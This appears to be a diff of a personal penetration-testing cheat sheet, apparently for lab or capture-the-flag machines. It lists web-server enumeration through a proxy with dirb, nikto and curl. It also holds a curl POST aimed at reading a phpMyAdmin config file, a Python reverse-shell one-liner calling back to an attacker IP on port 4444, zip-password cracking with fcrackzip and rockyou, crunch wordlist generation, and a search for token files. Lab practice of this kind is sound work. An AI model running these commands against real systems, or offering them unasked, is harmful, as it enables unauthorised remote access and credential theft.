@@ -1,9 +1,22 @@
-Host Enumeration:
+web server behind proxy server!
+Dirb:
+dirb http://host /usr/share/wordlists/dirb/big.txt -p host:3128
 
-nmap : Service enumeration
-nmap -A -T4 -p- <host ip>
+Nikto:
+nikto -h host -useproxy host:3128
 
-Nikto scan via proxy
+Curl:
+curl -v host/robots.txt --proxy host:3128
 
-nikto -h 192.168.221.138 -useproxy http://localhost:3128
+curl -X POST -F 'file=/var/www/phpmy/config.inc.php' http://192.168.190.133/test.php
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.94.135",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Crack zip password:
+
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt -uv  flag.zip 
+
+Create password file!
+Crunch 7 7 -t ‘mos’%%%% -o test.txt 
+
 find / -name "*token*" 2>/dev/null
